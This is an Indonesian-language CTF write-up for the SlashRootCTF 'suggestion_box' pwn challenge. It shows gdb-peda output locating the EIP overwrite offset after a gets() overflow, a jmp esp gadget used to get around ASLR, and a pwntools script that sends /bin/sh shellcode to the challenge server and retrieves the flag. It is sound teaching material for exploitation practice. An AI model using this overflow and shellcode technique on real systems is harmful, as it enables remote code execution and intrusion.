@@ -1,0 +1,148 @@
+
+
+~ Suggestion Box ~ Pwning ~ SlashRootCTF
+
+Diberikan sebuah binary suggestion_box dan akses nc di 103.200.7.150 8888
+Contoh ketka saya mengakses nc
+
+---------------------------------------------------------------------------------
+ramdhan@n0psledbyt3:~/slashroot$ nc 103.200.7.150 8888
+[+] SlashRoot CTF Box Suggestion [+]
+Enter your suggestion: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Too long dude, we need the point only!
+----------------------------------------------------------------------------------
+
+Program hanya meminta sebuah input. Sekarang kita decompile menggunakan ida
+
+----------------------
+  printf("Enter your suggestion: ");
+  fflush(stdout);
+  gets((char *)&v4)
+----------------------
+
+Seperti overflow lainnya, program menggunakan fungsi gets untuk menerima input. Tujuan
+kita adalah menimpa eip dengan alamat shellcode kita agar kita bisa mengakses shell. Pertama
+kita harus tau, berapa panjang byte inputan kita sampai menimpa eip. Saya menggunakan gdb
+peda.
+
+--------------------------------------------------------------------------------------------------------
+ramdhan@n0psledbyt3:~/slashroot$ gdb ./suggestion_box -q
+
+warning: build/bdist.linux-x86_64/wheel/peda/peda.py: No such file or directory
+Reading symbols from ./suggestion_box...(no debugging symbols found)...done.
+gdb-peda$ pattern_create 200 /tmp/b
+Writing pattern of 200 chars to filename "/tmp/b"
+gdb-peda$ run < /tmp/b
+Starting program: /home/ramdhan/slashroot/suggestion_box < /tmp/b
+[+] SlashRoot CTF Box Suggestion [+]
+Enter your suggestion: Too long dude, we need the point only!
+
+Program received signal SIGSEGV, Segmentation fault.
+
+ [----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xf7fa7870 --> 0x0 
+EDX: 0x0 
+ESI: 0x1 
+EDI: 0xf7fa6000 --> 0x1b2db0 
+EBP: 0x6941414d ('MAAi')
+ESP: 0xffffd270 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+EIP: 0x41384141 ('AA8A')
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41384141
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41384141 in ?? ()
+gdb-peda$ pattern_search AA8A
+Registers contain pattern buffer:
+EIP+0 found at offset: 112
+EBP+0 found at offset: 108
+----------------------------------------------------------------------------------------------------------
+
+Kita lihat diatas, eip tertimpa pada byte ke 112. Sekarang kita test dengan 112 byte input ditambah
+4byte untuk menimpa eip.
+
+------------------------------------------------------------------------------------
+ramdhan@n0psledbyt3:~/slashroot$ python -c 'print "A"*112+"BBBB"' > /tmp/b
+ramdhan@n0psledbyt3:~/slashroot$ gdb ./suggestion_box -q
+warning: build/bdist.linux-x86_64/wheel/peda/peda.py: No such file or directory
+Reading symbols from ./suggestion_box...(no debugging symbols found)...done.
+gdb-peda$ run < /tmp/b
+Starting program: /home/ramdhan/slashroot/suggestion_box < /tmp/b
+[+] SlashRoot CTF Box Suggestion [+]
+Enter your suggestion: Too long dude, we need the point only!
+
+Program received signal SIGSEGV, Segmentation fault.
+
+ [----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xf7fa7870 --> 0x0 
+EDX: 0x0 
+ESI: 0x1 
+EDI: 0xf7fa6000 --> 0x1b2db0 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd270 --> 0x0 
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x42424242
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+-----------------------------------------------------------------------------------
+
+Lihat diatas eip bernilai 0x42424242 (BBBB), ini berasal dari inputan kita "A"*112+"BBBB".
+Kita sudah bisa mengontrol eip, dan kita akan mengarahkan eip ke alamat shellcode kita berada
+
+Singkat cerita, saya sudah melakukan berbagai macam cara, dan gagal terus, sudah saya coba
+berbagai macam payload, tapi tidak berhasil. Ternyata server mengaktifkan aslr, kita tahu
+alamat stack pasti selalu berubah kita tidak tahu alamat pastinya dimana.
+
+Setelah saya berjalan2 di dissasmbly program suggestion_box saya menemukan pencerahan. pada
+alamat 0x08048500 saya menemukan intruksi "jmp esp" dengan intruksi ini.
+
+--------------------------------------------------
+.text:080484FD                 push    ebp
+.text:080484FE                 mov     ebp, esp
+.text:08048500                 jmp     esp
+.text:08048500 __init          endp
+.text:08048500
+--------------------------------------------------
+
+eip bisa kita arahkan ke shellcode kita, tanpa harus takut ASLR, karena area code tidak 
+menggunakan ASLR. Saya membuat script python untuk mengenerate payloadnya
+
+---------------------------------------------------
+ramdhan@n0psledbyt3:~/slashroot$ cat ex2.py
+from pwn import *
+addr = p32(0x08048500)        # jmp esp
+shell = asm(shellcraft.sh())  # shellcode /bin/sh
+nop = "\x90"*112
+payload = nop+addr+shell
+print payload 
+---------------------------------------------------
+
+Nantinya eip akan diarahkan ke jmp esp, dan dari situ eip akan loncat ke stack dan mengeksekusi
+shellcode kita. Sekarang kita testing shellocode, masuk ke shell dan dapatkan .flag nya :D
+
+---------------------------------------------------------------------------------
+ramdhan@n0psledbyt3:~/slashroot$ (python ex2.py; cat -) | nc 103.200.7.150 8888
+[+] SlashRoot CTF Box Suggestion [+]
+Enter your suggestion: Too long dude, we need the point only!
+ls
+bin
+dev
+lib
+lib32
+lib64
+suggestion_box
+cat .flag
+SlashRootCTF{agan_memang_SHELLalu_mhantap!}
+----------------------------------------------------------------------------------
+
+Flag : SlashRootCTF{agan_memang_SHELLalu_mhantap!}
